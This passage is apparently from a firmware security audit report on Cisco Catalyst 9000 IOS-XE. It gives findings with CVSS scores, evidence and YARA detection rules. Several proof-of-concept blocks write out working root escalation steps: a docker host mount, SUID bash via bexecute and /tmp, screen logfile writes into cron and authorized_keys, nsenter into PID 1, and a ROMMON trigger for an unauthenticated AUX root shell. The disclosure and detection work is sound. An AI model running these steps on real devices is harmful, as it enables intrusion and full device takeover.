+    the IOS-XE\@ secure boot chain. The developer comment confirms the security
+    assumption was never verified.
+  \item \texttt{ROMMON\_DEBUG\_CONF} allows remote delivery of a sourced bash file
+    that disables the hardware watchdog and suppresses critical process monitoring.
+  \item Both variables require only ROMMON access during a power cycle.
+\end{itemize}
+
+\subsubsection{Detection: YARA Rule}
+
+\begin{lstlisting}[style=yara]
+rule CAT9K_F7_ROMMON_Packages_Override_TFTP {
+    meta:
+        description = "ROMMON_PACKAGES_OVERRIDE accepts TFTP paths, bypassing signed boot"
+        id = "CAT9K-F7"
+        severity = "Medium"
+    strings:
+        $var   = "ROMMON_PACKAGES_OVERRIDE" ascii
+        $tftp  = "tftp:" ascii nocase
+        $fixme = "MCP_FIXME" ascii
+    condition:
+        $var and ($tftp or $fixme)
+}
+\end{lstlisting}
+
+% -----------------------------------------
+\subsection{CAT9K-F8: \texorpdfstring{\texttt{binos}}{binos} User in docker Group; Guestshell in \texorpdfstring{\texttt{network-admin}}{network-admin} Group}
+% -----------------------------------------
+
+\begin{overviewbox}
+\path{bigbang/etc/group} assigns the \texttt{binos} service account (UID~85, the
+primary IOS-XE platform process user) to the \texttt{docker} group (GID~65535).
+Docker group membership provides effective root through a host filesystem bind-mount,
+regardless of any restricted shell configured for the account. The guestshell LXC
+container user is additionally a member of \texttt{network-admin} (GID~50000),
+granting the container user management-plane group access.
+
+CWE-269 (Improper Privilege Management), CWE-250 (Execution with Unnecessary Privileges)\\
+\textbf{CVSS~3.1:} 7.8 High \quad CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
+\end{overviewbox}
+
+\subsubsection{Technical Evidence}
+
+Relevant entries from \path{bigbang/etc/group} and \path{bigbang/etc/passwd}.
+
+\begin{pocbox}{Confirmed via Static Analysis of IOS-XE 17.18.04 bigbang/etc/group + bigbang/etc/passwd}
+\begin{lstlisting}
+# /etc/group:
+docker:x:65535:dockeruser,binos
+network-admin:x:50000:guestshell
+
+# /etc/passwd (binos entry):
+binos:x:85:85:binos:/home/binos:/usr/binos/conf/bshell.sh
+
+# Docker group membership provides effective root via:
+docker run --rm -v /:/host alpine chroot /host sh
+\end{lstlisting}
+\end{pocbox}
+
+\subsubsection{Impact}
+
+\begin{itemize}[nosep]
+  \item If any IOS-XE management path allows \texttt{binos} to invoke docker commands,
+    or if \texttt{bshell.sh} is bypassed, docker group membership provides a
+    single-step privilege escalation to host root.
+  \item The guestshell container user's membership in \texttt{network-admin} expands
+    the container's effective privilege to include management-plane group access on
+    the host.
+\end{itemize}
+
+\subsubsection{Detection: YARA Rule}
+
+\begin{lstlisting}[style=yara]
+rule CAT9K_F8_Binos_Docker_Group {
+    meta:
+        description = "binos service account assigned to docker group in IOS-XE production image"
+        id = "CAT9K-F8"
+        severity = "High"
+    strings:
+        $group = "docker:x:65535:" ascii
+        $binos  = "binos" ascii
+    condition:
+        $group and $binos
+}
+\end{lstlisting}
+
+% -----------------------------------------
+\subsection{CAT9K-F9: ConfD Trusts \texorpdfstring{\texttt{X-Forwarded-For}}{X-Forwarded-For}; Auth Proxy Hardcodes IPC Address \texttt{192.168.1.6:21111}}
+% -----------------------------------------
+
+\begin{overviewbox}
+ConfD (the Tail-f NETCONF/YANG daemon) is configured to trust \texttt{X-Forwarded-For}
+from proxies matching \texttt{allowedProxyIpPrefix=127.0.0.1/32}. OpenResty's
+authentication proxy forwards \texttt{\$proxy\_add\_x\_forwarded\_for} to the IOS
+HTTP authentication backend at the hardcoded address \texttt{http://192.168.1.6:21111},
+the IOS HTTP server's fixed internal IPC binding, identical across all Cat9K
+deployments.
+
+ConfD uses the forwarded IP for NACM rule evaluation. An injected
+\texttt{X-Forwarded-For} header reaching ConfD via SSRF, request smuggling, or any
+localhost-adjacent process can forge the session source IP to match a permitted
+management address.
+
+CWE-290 (Authentication Bypass by Spoofing), CWE-116 (Improper Encoding or Escaping of Output)\\
+\textbf{CVSS~3.1:} 5.9 Medium \quad CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N
+\end{overviewbox}
+
+\subsubsection{Technical Evidence}
+
+From \path{bigbang/etc/opt/confd/config/cisco/confd.conf.in} (lines 335--338) and
+\path{bigbang/usr/binos/openresty/nginx/conf/auth\_proxy.conf}.
+
+\begin{pocbox}{Confirmed via Static Analysis of IOS-XE 17.18.04 bigbang/etc/opt/confd/config/cisco/confd.conf.in + auth\_proxy.conf}
+\begin{lstlisting}
+<!-- confd.conf.in lines 335-338: -->
+<useForwardedClientIp>
+  <proxyHeaders>X-Forwarded-For</proxyHeaders>
+  <allowedProxyIpPrefix>127.0.0.1/32</allowedProxyIpPrefix>
+</useForwardedClientIp>
+
+# auth_proxy.conf:
+location = /auth_proxy {
+    internal;
+    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+    proxy_pass http://192.168.1.6:21111;
+}
+location = /session_key    { internal; proxy_pass http://192.168.1.6:21111; }
+location = /get_banner_login { internal; proxy_pass http://192.168.1.6:21111; }
+\end{lstlisting}
+\end{pocbox}
+
+\subsubsection{Impact}
+
+\begin{itemize}[nosep]
+  \item A spoofed \texttt{X-Forwarded-For} header matching a permitted management IP
+    bypasses IP-based NACM restrictions in ConfD.
+  \item The attack path requires injecting the header via SSRF in OpenResty, HTTP
+    request smuggling, or any localhost-adjacent process.
+  \item \texttt{192.168.1.6:21111} is the same on every Cat9K deployment, eliminating
+    per-device reconnaissance for this component.
+\end{itemize}
+
+\subsubsection{Detection: YARA Rule}
+
+\begin{lstlisting}[style=yara]
+rule CAT9K_F9_ConfD_XForwardedFor_Trust {
+    meta:
+        description = "ConfD configured to trust X-Forwarded-For from 127.0.0.1/32"
+        id = "CAT9K-F9"
+        severity = "Medium"
+    strings:
+        $xfwd  = "X-Forwarded-For" ascii
+        $proxy = "allowedProxyIpPrefix" ascii
+        $addr  = "127.0.0.1/32" ascii
+    condition:
+        all of them
+}
+\end{lstlisting}
+
+% -----------------------------------------
+\subsection{CAT9K-F10: \texorpdfstring{\texttt{qemu.conf}}{qemu.conf} Sets \texttt{user=root group=root}; Guest Escape Delivers Host Root}
+% -----------------------------------------
+
+\begin{overviewbox}
+The libvirt QEMU configuration shipped in the production rpbase package contains only
+two active directives: \texttt{user = root} and \texttt{group = root}. All IOx guest
+VM processes run as host UID~0 and GID~0. Standard hardening via a dedicated
+\texttt{qemu} or \texttt{libvirt-qemu} service account is absent.
+
+A guest-to-host escape through QEMU device emulation, virtio, or memory handling
+delivers root access on the IOS-XE host OS rather than dropping into an unprivileged
+account.
+
+CWE-250 (Execution with Unnecessary Privileges), CWE-269 (Improper Privilege Management)\\
+\textbf{CVSS~3.1:} 6.3 Medium \quad CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H
+\end{overviewbox}
+
+\subsubsection{Technical Evidence}
+
+All other directives in \path{bigbang/3pa/etc/libvirt/qemu.conf} are commented out.
+The active directive count is two. The 17.8\,MB \texttt{qemu-kvm} ELF binary is
+present in \path{bigbang/3pa/usr/bin/}.
+
+\begin{pocbox}{Confirmed via Static Analysis of IOS-XE 17.18.04 bigbang/3pa/etc/libvirt/qemu.conf}
+\begin{lstlisting}
+# Active (non-comment) directives only:
+user = root
+group = root
+
+# Standard hardening absent:
+# user = "qemu"
+# group = "qemu"
+
+# Production QEMU-KVM binary:
+-rwxr-xr-x root/root 17834496 bigbang/3pa/usr/bin/qemu-kvm
+\end{lstlisting}
+\end{pocbox}
+
+\subsubsection{Impact}
+
+\begin{itemize}[nosep]
+  \item Any QEMU CVE involving a guest-to-host escape is immediately equivalent to
+    a host root compromise on the device.
+  \item This eliminates the privilege-separation layer that QEMU's user model is
+    designed to provide.
+\end{itemize}
+
+\subsubsection{Detection: YARA Rule}
+
+\begin{lstlisting}[style=yara]
+rule CAT9K_F10_QEMU_Root_Execution {
+    meta:
+        description = "qemu.conf runs all guest VMs as host root"
+        id = "CAT9K-F10"
+        severity = "Medium"
+    strings:
+        $user  = "user = root" ascii
+        $group = "group = root" ascii
+    condition:
+        all of them
+}
+\end{lstlisting}
+
+% -----------------------------------------
+\subsection{CAT9K-F11: leabasdk Test TLS Private Keys Shipped Unencrypted to Production}
+% -----------------------------------------
+
+\begin{overviewbox}
+Three RSA private keys for the leabasdk CLI TLS test interface are present in the
+production firmware at
+\path{bigbang/usr/lib64/leabasdk/test/api/cli\_tls/keys/}. Two of the three
+(\texttt{client.key} and \texttt{server.key}) are unencrypted at rest, confirmed by
+the absence of a \texttt{Proc-Type} header. All three carry executable permission
+bits, anomalous for key material. Identical copies exist in the symphony/ tree.
+
+CWE-321 (Use of Hard-coded Cryptographic Key), CWE-312 (Cleartext Storage of Sensitive Information)\\
+\textbf{CVSS~3.1:} 5.9 Medium \quad CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N
+\end{overviewbox}
+
+\subsubsection{Technical Evidence}
+
+File listing from the inner SquashFS and header inspection for all three keys.
+
+\begin{pocbox}{Confirmed via Static Analysis of IOS-XE 17.18.04 bigbang/usr/lib64/leabasdk/test/api/cli\_tls/keys/}
+\begin{lstlisting}
+# SquashFS listing:
+-rwxr-xr-x root/root  3311 .../cli_tls/keys/ca.key
+-rwxr-xr-x root/root  3243 .../cli_tls/keys/client.key
+-rwxr-xr-x root/root  3243 .../cli_tls/keys/server.key
+
+# ca.key -- encrypted:
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: DES-EDE3-CBC,<iv>
+
+# client.key -- NO Proc-Type header, unencrypted:
+-----BEGIN RSA PRIVATE KEY-----
+MIIJKQIBAAKCAgEAq7ELTtWcZv/rfnfhl1DZjcHWZEd6/qUISdr...
+
+# server.key -- same, no Proc-Type, unencrypted:
+-----BEGIN RSA PRIVATE KEY-----
+MIIJKAIBAAKCAgEA...
+\end{lstlisting}
+\end{pocbox}
+
+\subsubsection{Impact}
+
+\begin{itemize}[nosep]
+  \item \texttt{client.key} and \texttt{server.key} are directly usable from the
+    firmware image alone; no device access or passphrase is required.
+  \item If the leabasdk CLI TLS interface uses these as default credentials, an
+    attacker can impersonate either end of leabasdk communications, potentially
+    including Cisco Smart Licensing transactions.
+\end{itemize}
+
+\subsubsection{Detection: YARA Rule}
+
+\begin{lstlisting}[style=yara]
+rule CAT9K_F11_Leabasdk_Unencrypted_Keys {
+    meta:
+        description = "leabasdk test TLS private keys shipped unencrypted to production"
+        id = "CAT9K-F11"
+        severity = "Medium"
+    strings:
+        $key_header = "BEGIN RSA PRIVATE KEY" ascii
+        $path       = "leabasdk/test" ascii
+    condition:
+        all of them
+}
+\end{lstlisting}
+
+% -----------------------------------------
+\subsection{CAT9K-F12: \texorpdfstring{\texttt{codesign.pubkey}}{codesign.pubkey} Uses an Undocumented Cisco-Proprietary Binary Format}
+% -----------------------------------------
+
+\begin{overviewbox}
+The code-signing public key at the initramfs root uses a binary format identified by
+a four-byte proprietary magic header (\texttt{ae 02 25 ab}) that does not correspond
+to any IETF standard (PEM, DER, PKCS\#8, SubjectPublicKeyInfo, X.509). The format is
+not documented in any available Cisco IOS-XE security publication. Verification is
+performed exclusively by the stripped binary \path{usr/bin/code\_sign\_verify},
+preventing independent inspection of key algorithm, size, and parameter encoding.
+
+CWE-327 (Use of a Broken or Risky Cryptographic Algorithm)\\
+\textbf{CVSS~3.1:} 3.7 Low \quad CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N
+\end{overviewbox}
+
+\subsubsection{Technical Evidence}
+
+\texttt{codesign.pubkey} (19200~bytes) and \texttt{codesign.revkey} (300~bytes) are
+at the initramfs CPIO root. Standard tools cannot parse either file.
+
+\begin{pocbox}{Confirmed via Static Analysis of IOS-XE 17.18.04 initramfs/codesign.pubkey (19200 bytes)}
+\begin{lstlisting}
+$ xxd codesign.pubkey | head -3
+00000000: ae02 25ab 1234 cd01 0001 0202 0000 0000  ..%..4..........
+00000010: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+
+$ file codesign.pubkey
+codesign.pubkey: data        # not PEM, DER, or PKCS#8
+
+$ openssl pkey -in codesign.pubkey -inform DER -noout 2>&1
+unable to load key
+
+$ nm /usr/bin/code_sign_verify 2>&1
+nm: code_sign_verify: no symbols
+\end{lstlisting}
+\end{pocbox}
+
+\subsubsection{Impact}
+
+\begin{itemize}[nosep]
+  \item The proprietary format prevents independent validation of key algorithm and
+    size without reverse engineering \path{code\_sign\_verify}. If the format
+    encodes weaker parameters than the secure boot documentation claims, the
+    code-signing chain provides less assurance than assumed.
+  \item Third-party audits of the IOS-XE\@ secure boot chain cannot independently
+    verify the public key parameters.
+\end{itemize}
+
+\subsubsection{Detection: YARA Rule}
+
+\begin{lstlisting}[style=yara]
+rule CAT9K_F12_Codesign_Proprietary_Format {
+    meta:
+        description = "Cisco-proprietary codesign.pubkey format; not standard PEM/DER"
+        id = "CAT9K-F12"
+        severity = "Low"
+    strings:
+        $magic    = { AE 02 25 AB }
+        $verifier = "code_sign_verify" ascii
+    condition:
+        $magic and $verifier
+}
+\end{lstlisting}
+
+% -----------------------------------------
+\subsection{CAT9K-F13: \texorpdfstring{\texttt{auxinit.sh}}{auxinit.sh} \texorpdfstring{\texttt{ROMMON\_SR\_INIT\_SHELL}}{ROMMON\_SR\_INIT\_SHELL} Glob Backdoor --- AUX Port Root Shell}
+% -----------------------------------------
+
+\begin{overviewbox}
+The AUX port initialization script checks whether \texttt{ROMMON\_SR\_INIT\_SHELL}
+glob-matches the substring \texttt{aux\_do\_system\_shell}. If matched, the script
+exports root's home directory and execs \path{/bin/bash -l} with no authentication.
+This occurs before IOS-XE\@ authentication services start and is therefore immune to
+IOS-XE\@ AAA reconfiguration. The attack requires only ROMMON access during a power
+cycle and physical AUX port access after reboot.
+
+CWE-306 (Missing Authentication for Critical Function), CWE-489 (Active Debug Code)\\
+\textbf{CVSS~3.1:} 6.8 Medium \quad CVSS:3.1/AV:P/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+\end{overviewbox}
+
+\subsubsection{Technical Evidence}
+
+The complete trigger block from \path{bigbang/etc/auxinit.sh}.
+
+\begin{pocbox}{Confirmed via Static Analysis of IOS-XE 17.18.04 bigbang/etc/auxinit.sh}
+\begin{lstlisting}[style=bash]
+if [[ "${ROMMON_SR_INIT_SHELL:-}" == *"aux_do_system_shell"* ]]; then
+    export HOME=/root
+    cd $HOME
+    /bin/bash -l    # no authentication; root shell on AUX port
+fi
+
+# Attack path:
+# 1. ROMMON> set ROMMON_SR_INIT_SHELL=aux_do_system_shell
+# 2. ROMMON> boot
+# 3. Connect to physical AUX port (RJ-45 serial, all Cat9K)
+# => Root bash shell, no credential prompt.
+\end{lstlisting}
+\end{pocbox}
+
+\subsubsection{Impact}
+
+\begin{itemize}[nosep]
+  \item The delivered shell is \path{/bin/bash -l} as root. No credential prompt,
+    no PAM invocation, no IOS-XE\@ AAA check.
+  \item The backdoor activates before IOS-XE\@ authentication services start and
+    survives any AAA reconfiguration applied after the ROMMON variable is set.
+  \item The glob match (\texttt{*aux\_do\_system\_shell*}) accepts any string
+    containing the trigger phrase, including composite values.
+\end{itemize}
+
+\subsubsection{Detection: YARA Rule}
+
+\begin{lstlisting}[style=yara]
+rule CAT9K_F13_Auxinit_Shell_Glob_Backdoor {
+    meta:
+        description = "auxinit.sh ROMMON glob delivers unauthenticated AUX root shell"
+        id = "CAT9K-F13"
+        severity = "Medium"
+    strings:
+        $var     = "ROMMON_SR_INIT_SHELL" ascii
+        $trigger = "aux_do_system_shell" ascii
+        $shell   = "/bin/bash -l" ascii
+    condition:
+        all of them
+}
+\end{lstlisting}
+
+% -----------------------------------------
+\subsection{CAT9K-F14: \texorpdfstring{\texttt{bexecute}}{bexecute} SUID Whitelist --- \texorpdfstring{\texttt{shell\_exec.sh}}{shell\_exec.sh} \texttt{/tmp} TOCTOU Local Privilege Escalation}
+% -----------------------------------------
+
+\begin{overviewbox}
+The \texttt{bexecute} SUID binary (rwsr-sr-x root/root) whitelists \texttt{shell\_exec.sh}
+in \path{/usr/binos/conf/uicmd.conf}. When invoked, \texttt{shell\_exec.sh} constructs a
+file path as \texttt{/tmp/.shell\_exec.\$\{args\_id\}} where \texttt{args\_id} is the
+caller-supplied first argument, then bash-sources that file with root effective UID.
+The \texttt{/tmp} directory is world-writable. Pre-creating the args file with malicious
+content before invoking \texttt{bexecute} delivers arbitrary code execution as root from
+any low-privileged IOS-XE shell user.
+
+\href{https://cwe.mitre.org/data/definitions/377.html}{CWE-377} (Insecure Temporary File),
+\href{https://cwe.mitre.org/data/definitions/362.html}{CWE-362} (Race Condition),
+\href{https://cwe.mitre.org/data/definitions/269.html}{CWE-269} (Improper Privilege Management)\\
+\textbf{CVSS~3.1:} 7.8 High \quad CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
+\end{overviewbox}
+
+\subsubsection{Technical Evidence}
+
+\path{shell\_exec.sh} sources an attacker-controlled file from \texttt{/tmp} with root euid.
+
+\begin{pocbox}{Confirmed via Static Analysis of IOS-XE 17.18.04 bigbang/usr/binos/conf/shell\_exec.sh}
+\begin{lstlisting}[style=bash]
+# shell_exec.sh line 28-45 (abbreviated)
+args_id="${1}"                             # caller-controlled, no sanitization
+args_file="/tmp/.shell_exec.${args_id}"   # world-writable /tmp path
+
+# ...
+source "${args_file}"   # sourced as bash with root euid via bexecute SUID
+# ...
+rm -f "${args_file}"    # cleanup destroys evidence after execution
+
+# Attack:
+# 1. echo 'chmod +s /bin/bash' > /tmp/.shell_exec.exploit
+# 2. bexecute shell_exec.sh exploit
+# => /bin/bash is now SUID; /bin/bash -p delivers root
+\end{lstlisting}
+\end{pocbox}
+
+\subsubsection{Impact}
+
+\begin{itemize}[nosep]
+  \item Local privilege escalation from any IOS-XE shell account to root.
+  \item \texttt{bexecute} is used by 80+ administrative scripts; \texttt{shell\_exec.sh}
+    handles NETCONF sessions and container management, making args\_id values
+    predictable from process IDs visible in \texttt{/proc} or \texttt{/tmp}.
+  \item The \texttt{rm -f} at line 88 removes the args file after sourcing,
+    leaving no persistent evidence of the injected payload.
+\end{itemize}
+
+\subsubsection{Detection: YARA Rule}
+
+\begin{lstlisting}[style=yara]
+rule CAT9K_F14_Bexecute_ShellExec_TOCTOU {
+    meta:
+        description = "bexecute SUID + shell_exec.sh /tmp race LPE"
+        id = "CAT9K-F14"
+        severity = "High"
+    strings:
+        $bexec   = "bexecute" ascii
+        $src     = "source \"${args_file}\"" ascii
+        $tmppath = "/tmp/.shell_exec." ascii
+    condition:
+        all of them
+}
+\end{lstlisting}
+
+% -----------------------------------------
+\subsection{CAT9K-F15: GNU \texttt{screen} 4.9.1 SUID Root --- Logfile Arbitrary Write Privilege Escalation}
+% -----------------------------------------
+
+\begin{overviewbox}
+GNU screen 4.9.1 ships SUID root (rwsr-sr-x root/root, 452 KB) at \path{/usr/bin/screen}
+on all Cat9K platform trees. The SUID bit is required for screen's multiuser session
+sharing feature, which has no legitimate use on a network device. The \texttt{-Logfile}
+flag writes session output to an arbitrary filesystem path as root. Combined with
+\texttt{-D~-m} (detached daemon mode), any local user can append to root-owned files
+including \texttt{/etc/crontab}, cron job directories, and SSH authorized keys.
+
+\href{https://cwe.mitre.org/data/definitions/269.html}{CWE-269} (Improper Privilege Management),
+\href{https://cwe.mitre.org/data/definitions/250.html}{CWE-250} (Execution with Unnecessary Privileges)\\
+\textbf{CVSS~3.1:} 7.8 High \quad CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
+\end{overviewbox}
+
+\subsubsection{Technical Evidence}
+
+The \texttt{-Logfile} flag is confirmed present in the binary's help strings.
+
+\begin{pocbox}{Confirmed via Static Analysis of IOS-XE 17.18.04 bigbang/usr/bin/screen}
+\begin{lstlisting}[style=bash]
+# screen 4.9.1, -rwsr-sr-x root/root, 452656 bytes
+# Binary strings confirm: "-Logfile file  Set logfile name."
+#                         "Must run suid root for multiuser support."
+
+# LPE via logfile write-as-root:
+screen -D -m -L -Logfile /etc/cron.d/rootshell /bin/sh -c \
+  'echo "* * * * * root chmod +s /bin/bash" >&3'
+# => cron runs "chmod +s /bin/bash" as root on next minute tick
+
+# Alternative: append SSH key as root
+screen -D -m -L -Logfile /root/.ssh/authorized_keys \
+  /bin/sh -c 'echo "ssh-rsa AAAAB... attacker" >&3'
+\end{lstlisting}
+\end{pocbox}
+
+\subsubsection{Impact}
+
+\begin{itemize}[nosep]
+  \item Any user with shell access can write to any root-owned path via
+    screen's \texttt{-Logfile} flag, including cron directories, SSH keys,
+    and library preload files.
+  \item Screen 4.9.1 includes no CVE for this behavior; it is a design
+    feature that is dangerous only when the SUID bit is present.
+  \item The SUID bit should be removed (\texttt{chmod -s /usr/bin/screen})
+    or screen should be excluded from production firmware entirely.
+\end{itemize}
+
+\subsubsection{Detection: YARA Rule}
+
+\begin{lstlisting}[style=yara]
+rule CAT9K_F15_Screen_SUID_LPE {
+    meta:
+        description = "screen 4.9.1 SUID root logfile arbitrary write LPE"
+        id = "CAT9K-F15"
+        severity = "High"
+    strings:
+        $ver     = "screen-4.9.1" ascii
+        $logfile = "-Logfile file" ascii
+        $suid    = "Must run suid root for multiuser support." ascii
+    condition:
+        all of them
+}
+\end{lstlisting}
+
+% -----------------------------------------
+\subsection{CAT9K-F16: SUID \texorpdfstring{\texttt{nsenter}}{nsenter} --- Unrestricted Linux Namespace Escape}
+% -----------------------------------------
+
+\begin{overviewbox}
+\texttt{nsenter} (util-linux 2.39.3) ships SUID root (rwsr-sr-x root/root, 43 KB) at
+\path{/usr/bin/nsenter}. Any process can invoke it to attach to any running process's
+Linux namespaces (PID, mount, network, IPC, user) without privilege. The
+\texttt{-S~0~-G~0} flags set UID/GID to root inside the entered namespace. On Cat9K
+devices running IOx containerized applications, SUID nsenter enables container escape:
+enter the container's mount namespace from the host or, from inside the container,
+attach to the host's PID namespace. The companion script \texttt{nsenter\_exec.sh}
+reads the target PID from \texttt{/tmp/app\_pid.txt} (world-writable), allowing
+any user to redirect namespace entry to an arbitrary process.
+
+\href{https://cwe.mitre.org/data/definitions/269.html}{CWE-269} (Improper Privilege Management),
+\href{https://cwe.mitre.org/data/definitions/250.html}{CWE-250} (Execution with Unnecessary Privileges)\\
+\textbf{CVSS~3.1:} 7.8 High \quad CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
+\end{overviewbox}
+
+\subsubsection{Technical Evidence}
+
+\path{nsenter\_exec.sh} reads PID from a world-writable \texttt{/tmp} file and passes
+unquoted arguments directly to \texttt{nsenter}.
+
+\begin{pocbox}{Confirmed via Static Analysis of IOS-XE 17.18.04 bigbang/usr/binos/conf/nsenter\_exec.sh}
+\begin{lstlisting}[style=bash]
+# nsenter_exec.sh (abbreviated)
+GSPID=$(</tmp/app_pid.txt)   # world-writable; any user can set target PID
+# ...
+/usr/bin/nsenter -t $GSPID -m -u -i -n -p -U -S 0 -G 0 -r -w -Z \
+  env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin $1
+# $GSPID and $1 unquoted (word-split on whitespace)
+
+# Direct SUID call (no script needed):
+/usr/bin/nsenter -t 1 -m -u -i -n -p /bin/sh
+# => Enters init (PID 1) namespaces; -S 0 -G 0 sets root in namespace
+\end{lstlisting}
+\end{pocbox}
+
+\subsubsection{Impact}
+
+\begin{itemize}[nosep]
+  \item Any local user can enter any process's namespace set, including the
+    init namespace (PID 1), with root credentials inside the namespace.
+  \item On IOx deployments: enables container escape by entering the container
+    process's mount namespace from the host side.
+  \item \texttt{/tmp/app\_pid.txt} (world-writable) lets any user redirect
+    \texttt{nsenter\_exec.sh} to target any PID, not only the intended guestshell PID.
+  \item Mitigation: restrict nsenter to specific management users via sudo; remove
+    SUID and use \texttt{CAP\_SYS\_ADMIN} scoped to the guestshell management service.
+\end{itemize}
+
+\subsubsection{Detection: YARA Rule}
+
+\begin{lstlisting}[style=yara]
+rule CAT9K_F16_SUID_Nsenter_Namespace_Escape {
+    meta:
+        description = "SUID nsenter unrestricted namespace escape; /tmp PID source"
+        id = "CAT9K-F16"
+        severity = "High"
+    strings:
+        $nsenter = "/usr/bin/nsenter" ascii
+        $tmppath = "/tmp/app_pid.txt" ascii
+        $flags   = "-S 0 -G 0" ascii
+    condition:
+        all of them
+}
+\end{lstlisting}
+
+% -----------------------------------------
+\subsection{CAT9K-F17: SUID \texorpdfstring{\texttt{runc}}{runc} v1.1.12+dev --- OCI Container Runtime with Unconfirmed CVE-2024-21626 Patch Status}
+% -----------------------------------------
+
+\begin{overviewbox}
+\texttt{runc} v1.1.12+dev (Go 1.22.2, 9.68\,MB) ships SUID root (rwsr-sr-x root/root) at
+\path{/usr/bin/runc}, providing OCI container runtime for IOx applications. The
+\texttt{+dev} suffix identifies a pre-release development build; its relationship to the
+CVE-2024-21626 fix commits (merged to main 2024-01-31, released in 1.1.12 on 2024-02-13)
+is not determinable from the binary alone. CVE-2024-21626 (CVSS 8.6 High) allows a
+container process to obtain a host-filesystem file descriptor via a \texttt{/proc/self/fd}
+workdir leak and escape to host root. Independently of CVE applicability, deploying a SUID
+container runtime on production network infrastructure amplifies every future runc
+vulnerability.
+
+\href{https://cwe.mitre.org/data/definitions/403.html}{CWE-403} (Exposure of File Descriptor to Unintended Control Sphere),
+\href{https://cwe.mitre.org/data/definitions/269.html}{CWE-269} (Improper Privilege Management)\\
+\textbf{CVSS~3.1:} 8.6 High \quad CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H
+\end{overviewbox}
+
+\subsubsection{Technical Evidence}
+
+Version string and module path confirmed from binary strings output.
+
+\begin{pocbox}{Confirmed via Static Analysis of IOS-XE 17.18.04 bigbang/usr/bin/runc}
+\begin{lstlisting}[style=bash]
+# Binary evidence:
+# -rwsr-sr-x root/root 9,680,544 bytes (unsquashfs -lls)
+# strings output: "github.com/opencontainers/runc" module path
+# version: 1.1.12+dev, Go 1.22.2
+
+# CVE-2024-21626 mechanism (affects runc <= 1.1.11):
+# 1. Craft container spec with workdir set to /proc/self/fd/<leaked-fd>
+# 2. runc leaks host-side fd during container setup
+# 3. Container process opens /proc/self/fd/<n> => gets host filesystem fd
+# 4. Write /etc/crontab or /root/.ssh/authorized_keys via host fd
+# => Full host root escape from container
+
+# +dev build: patch applicability requires Go module checksum verification
+# against runc@v1.1.12 release tag
+\end{lstlisting}
+\end{pocbox}
+
+\subsubsection{Impact}
+
+\begin{itemize}[nosep]
+  \item If the \texttt{+dev} build predates the CVE-2024-21626 fix commits
+    (2024-01-31), any IOx container tenant can escape to host root.
+  \item SUID deployment on production switching hardware amplifies every future
+    runc vulnerability beyond the scope of normal container isolation failures.
+  \item Cisco should pin to a release-tagged version and document the patch epoch
+    in the firmware bill of materials.
+\end{itemize}
+
+\subsubsection{Detection: YARA Rule}
+
+\begin{lstlisting}[style=yara]
+rule CAT9K_F17_SUID_Runc_Dev_Build {
+    meta:
+        description = "SUID runc +dev build; CVE-2024-21626 patch status unconfirmed"
+        id = "CAT9K-F17"
+        severity = "High"
+    strings:
+        $path = "github.com/opencontainers/runc" ascii
+        $ver  = "1.1.12+dev" ascii
+    condition:
+        all of them
+}
+\end{lstlisting}
+
+% =============================================================
+\section{CWE Glossary}
+% =============================================================
+
+\begin{longtable}{@{}lL{8cm}L{4cm}@{}}
+  \toprule
+  \textbf{CWE} & \textbf{Description} & \textbf{Findings} \\
+  \midrule \endfirsthead
+  \toprule
+  \textbf{CWE} & \textbf{Description} & \textbf{Findings} \\
+  \midrule \endhead
+  \bottomrule \endlastfoot
+  \href{https://cwe.mitre.org/data/definitions/116.html}{CWE-116}
+    & Improper Encoding or Escaping of Output & F9 \\[0.3em]
+  \href{https://cwe.mitre.org/data/definitions/250.html}{CWE-250}
+    & Execution with Unnecessary Privileges & F8, F10, F15, F16 \\[0.3em]
+  \href{https://cwe.mitre.org/data/definitions/269.html}{CWE-269}
+    & Improper Privilege Management & F3, F4, F8, F10, F14, F15, F16, F17 \\[0.3em]
+  \href{https://cwe.mitre.org/data/definitions/290.html}{CWE-290}
+    & Authentication Bypass by Spoofing & F9 \\[0.3em]
+  \href{https://cwe.mitre.org/data/definitions/306.html}{CWE-306}
+    & Missing Authentication for Critical Function & F2, F4, F13 \\[0.3em]
+  \href{https://cwe.mitre.org/data/definitions/312.html}{CWE-312}
+    & Cleartext Storage of Sensitive Information & F11 \\[0.3em]
+  \href{https://cwe.mitre.org/data/definitions/321.html}{CWE-321}
+    & Use of Hard-coded Cryptographic Key & F1, F11 \\[0.3em]
+  \href{https://cwe.mitre.org/data/definitions/327.html}{CWE-327}
+    & Use of a Broken or Risky Cryptographic Algorithm & F12 \\[0.3em]
+  \href{https://cwe.mitre.org/data/definitions/362.html}{CWE-362}
+    & Race Condition (Concurrent Execution) & F14 \\[0.3em]
+  \href{https://cwe.mitre.org/data/definitions/377.html}{CWE-377}
+    & Insecure Temporary File & F14 \\[0.3em]
+  \href{https://cwe.mitre.org/data/definitions/403.html}{CWE-403}
+    & Exposure of File Descriptor to Unintended Control Sphere & F17 \\[0.3em]
+  \href{https://cwe.mitre.org/data/definitions/489.html}{CWE-489}
+    & Active Debug Code & F6, F7, F13 \\[0.3em]
+  \href{https://cwe.mitre.org/data/definitions/494.html}{CWE-494}
+    & Download of Code Without Integrity Check & F5, F7 \\[0.3em]
+  \href{https://cwe.mitre.org/data/definitions/532.html}{CWE-532}
+    & Insertion of Sensitive Information into Log File & F6 \\[0.3em]
+  \href{https://cwe.mitre.org/data/definitions/732.html}{CWE-732}
